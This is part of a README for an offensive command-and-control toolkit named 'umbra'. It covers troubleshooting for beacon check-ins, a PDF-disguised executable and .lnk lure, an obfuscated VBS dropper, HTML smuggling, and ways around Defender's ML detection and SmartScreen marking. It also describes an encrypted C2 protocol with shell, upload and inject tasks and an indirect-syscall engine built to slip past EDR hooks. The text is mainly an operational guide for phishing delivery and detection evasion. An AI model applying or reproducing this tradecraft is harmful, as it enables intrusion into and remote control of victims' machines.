| Beacon process appears and **disappears** right after 1 check-in (e.g. `pid=7020` gone within ~1–2 min), or the `.lnk`'s `powershell.exe` exits as soon as it runs | `reflect.ps1` starts the PE on a **thread** and returns immediately; without `-Wait`, the `.lnk`'s `powershell -c` finishes, the host process dies and takes the beacon thread with it (a finite `WaitSeconds` has the same effect when it expires) | use the cradle with `-Wait -WaitSeconds 0` (0 = wait forever); `make_lnk_payload.sh` in `MODE=reflect` already injects it. Rebuild (`bash scripts/run.sh build`) and **re-download the `.lnk`** on the target |
| Beacon **never** checks in and the `.lnk`/host dies with `flag provided but not defined: -NoProfile` (exit code 2) | the beacon reflectively mapped inside `powershell.exe` inherited the host arguments (`-NoProfile -w hidden ...`); `flag.Parse()` rejected them and the `flag` package's `os.Exit(2)` killed the entire host process | already fixed in `cmd/beacon/main.go` (it uses its own `FlagSet`, `ContinueOnError` + `SetOutput(io.Discard)`, so unknown host arguments are ignored). Rebuild the beacon: `bash scripts/run.sh build` |
| `verify.sh` reports `GET /blob.hex -> 404` (or `GET /loader.exe -> 404`) but the site is up | `verify.sh` was checking the assets of the wrong mode: `MODE=reflect` publishes `/reflect.ps1` + `/loader.exe`; `MODE=stage` publishes `/stage.ps1` + `/blob.hex`. Checking the wrong pair gives a false negative | run `MODE=reflect bash scripts/verify.sh` (or `MODE=stage ...`); the script now picks the right pair from `$MODE` |
| The EDR detects the `.lnk` on double-click (`Trojan:Win32/Commando.AIml`), but running `loader.exe` directly passes | Defender's ML evaluates the **PowerShell command line** (the `powershell -w hidden -c ...` cradle), not the beacon binary | remove PowerShell from the chain: `MODE=curl` on the `.lnk` (`cmd.exe` + System32 `curl.exe`) or the `.vbs` dropper (`make_vbs_payload.sh`); neither invokes `powershell.exe` |
| The page downloads the `.exe`, but the saved name is wrong (`.download` suffix, etc.) | the file did not go through `serve.py` (missing `.exe` MIME) or `CONFIG.PAYLOAD_URL`/`PAYLOAD_NAME` do not match what is in `dist/` | run `bash scripts/build.sh` (stages `dist/$PAYLOAD_NAME`) and confirm at the edge: `curl -sI https://c2.example.com/2026-Q3_Financial_Statement.pdf.exe | grep -i content-disposition` must show `attachment; filename="2026-Q3_Financial_Statement.pdf.exe"` |
| The downloaded `.exe` triggers SmartScreen on double-click | MOTW: Chromium browsers write `Zone.Identifier` on `.exe` (old Firefox usually does **not**) | on the target: `Unblock-File .\2026-Q3_Financial_Statement.pdf.exe` or `scripts\unblock.ps1`; deliver through old Firefox, or use `.lnk` `MODE=curl` / the `.vbs` dropper (curl does not write MOTW) |
| `ping c2.example.com` answers `203.0.113.10` (a public IP, not the LAN one) | **correct**: that is Cloudflare's anycast edge for the tunnel; the origin `192.0.2.10` receives no inbound connection — `cloudflared` opens the tunnel outbound | change nothing: the beacon connects to `c2.example.com:443` → edge → tunnel → `127.0.0.1:8443` (C2) |
| SmartScreen warns when opening the `.lnk` | reputation check on the downloaded file | see the notes below; check the downloaded file's MOTW |
| The site opens but shows **another application** (e.g. the `code-server` login page) | the `serve.sh` port is taken by another app, or the tunnel points at the old port | set `HTTP_PORT` in `scripts/umbra.env` (once) and run `serve.sh` + `cf_tunnel.sh` again; the tunnel pre-flight refuses to publish if the marker is missing from the page |
| `curl` on Kali gives `000`/`connection refused`, but the site works | `/etc/hosts` (or local DNS) resolves the domain to the LAN IP, so `curl` never touches Cloudflare | use `bash scripts/verify.sh` (it does `--resolve` to the real edge IP) |
| Beacon never checks in, even with the C2 up | you pinned (`-pin`) the **origin** fingerprint, but through the tunnel the edge presents Cloudflare's certificate | leave `-pin` empty in `cmd/pack`; only pin if the beacon talks directly to the C2 |
| `port 8080 is already in use` when starting `serve.sh` | another service (commonly `code-server`) already uses `8080` | set `HTTP_PORT=8082` in `scripts/umbra.env`; `cf_tunnel.sh` follows automatically |
| `Argument list too long` in old scripts | large base64 passed through argv | does not apply to this flow (no base64 goes through argv) |

### MOTW / SmartScreen on the `.lnk`

A `.lnk` downloaded by a browser **may** carry `Zone.Identifier` (*Mark-of-the-Web*), which
can trigger SmartScreen. To check on the target:

```powershell
Get-Item .\2026-Q3_Financial_Statement.pdf.lnk -Stream Zone.Identifier -ErrorAction SilentlyContinue |
  Get-Content
```

If MOTW is present and you want to test the behaviour without it, use `scripts/unblock.ps1`
(or the native cmdlet):

```powershell
Unblock-File .\2026-Q3_Financial_Statement.pdf.lnk
```

> **Honest limitation of this design:** the default delivers `loader.exe` to disk disguised
> as a PDF — Chromium may apply MOTW and SmartScreen may ask "More info" → "Run anyway";
> the `stage`/`reflect` chains keep everything in memory, but the PowerShell cradle may hit
> `Trojan:Win32/Commando.AIml`; `MODE=curl` and the `.vbs` dropper drop an exe in `%TEMP%`
> (curl does not write MOTW). No variant promises that SmartScreen will never check
> reputation: MOTW depends on the browser, the download channel and the target's Windows
> policies. Treat the behaviour as environment-dependent and validate it in your own lab.

### Missing `xxd`

If `make_shellcode.sh` complains about `xxd`, install `vim-common`
(`sudo apt install -y vim-common`) or let the script fall back to `hexdump`.

---

## C2 protocol

Each message travels as:

```text
magic("UMB1") || nonce(12) || AES-256-GCM(JSON)
```

over **HTTPS (TLS ≥ 1.2)**. The key is `SHA-256(passphrase)`. The beacon checks in
(hostname, user, OS/arch, PID) and receives the task queue; results return in the next
message.

Supported operations: `shell`, `download`, `upload`, `inject`, `sleep`, `exit`.

It operates without touching sensitive strings: config values are XOR-masked (mask
`umbra::c2::2026::mask`) + base64, and NT function names are referenced by
**pre-computed 64-bit FNV-1a constants** (`HashAllocVM`, `HashWriteVM`, ... in `hash.go`)
instead of runtime literals — no `Nt*`, URL, passphrase or the module name `ntdll.dll` comes
from umbra's code in the binary. The only occurrence of `ntdll.dll` is a constant from the
Go runtime itself (present in **any** Go binary for Windows), and the constant identifiers
do not survive `-ldflags "-s -w"`.

---

## Indirect syscall engine

The root package resolves NT system services at runtime and executes them through
*indirect syscalls*, without importing function pointers from `ntdll` (which would leave
strings in the import table that an EDR can hook and alert on).

Resolution flow:

1. **Locate `ntdll`** by walking the PEB (`gs:[0x60]` → `PEB->Ldr`) and the
   `InMemoryOrderModuleList`, comparing the FNV-1a hash of `BaseDllName` with the
   pre-computed `HashNtdll` constant — it does not depend on the exact module order and
   does not embed the module name as a string literal.
2. **Parse the export table** in memory (RVA, number of names, name/function/ordinal
   tables) in pure Go.
3. **Derive the SSN** by sorting the stubs by RVA; each stub's index is the service number.
4. **Find the gadget** `syscall;ret` (`0F 05 C3`) inside an unhooked stub and donate it to
   stubs that are hooked.
5. **Execute** via `MOVQ CX, R10; CALL R11`, so the kernel always returns to a legitimate
   address inside `ntdll`.

Function hashes use 64-bit FNV-1a with A–Z ASCII folding.

The shellcode execution runtime lives in `execute_windows.go`:

```text
NtAllocateVirtualMemory (RW)  ->  NtWriteVirtualMemory  ->
NtProtectVirtualMemory (RX)   ->  NtCreateThreadEx
```

The page is never RWX at any instant (RW → write → RX).

---

## Repository structure

The repository **is** the `github.com/nullbyter19/umbra` module:

```text
.
├── engine.go                     # Engine, New, Run/Syscall
├── hash.go / hash_test.go        # FNV-1a 64 + name table
├── resolver_windows.go           # PEB parse + export table
├── resolver_windows_amd64.s      # pebLdr()
├── syscall_windows_amd64.{go,s}  # invoke(): indirect syscall
├── execute_windows.go            # Run(): in-memory shellcode execution
├── resolver_other.go / syscall_other.go / execute_other.go   # non-Windows stubs
├── c2/proto/                     # AES-256-GCM envelope + messages
├── cmd/server/                   # C2 server (HTTPS + console)
├── cmd/beacon/                   # implant (config.go is generated by the packer)
├── cmd/pack/                     # beacon config packer
├── delivery/phish.html           # anchor lure (fallback; SMUGGLE=0)
├── delivery/stage.ps1            # fileless stager (hex download + Nt* injects in memory)
├── delivery/reflect.ps1          # reflective PE loader (map/reloc/IAT in memory)
├── scripts/umbra.env.example     # shared config template (copy to umbra.env)
├── scripts/build.sh              # pack + beacon build + dist/ staging
├── scripts/serve.sh              # serves dist/ on 127.0.0.1:$HTTP_PORT (loopback)
├── scripts/cf_tunnel.sh          # publishes the origin via Cloudflare Tunnel (ports from umbra.env)
├── scripts/verify.sh             # checks the public edge (curl --resolve + marker)
├── scripts/make_lnk.py           # pure-Python .lnk builder (MS-SHLLINK)
├── scripts/make_lnk_payload.sh   # builds the PDF-disguised .lnk
├── scripts/make_vbs.py           # generates the obfuscated .vbs dropper (Chr() chains)
├── scripts/make_vbs_payload.sh   # wrapper: downloads loader.exe on .vbs double-click
├── scripts/run.sh                # all-in-one launcher (build/serve/c2/tunnel/verify/status)
├── scripts/make_shellcode.sh     # generates blob.bin/blob.hex (raw hex, .bin or PE via Donut/sRDI)
├── scripts/make_smuggle.py       # self-contained evasive landing page (XOR+shuffled alphabet+chunks)
├── scripts/unblock.ps1           # removes Zone.Identifier (on the target)
├── examples/{sysinfo,inject}/
└── LICENSE / README.md
```

---

## License

MIT — see [LICENSE](LICENSE). © 2026 Milton Silva.
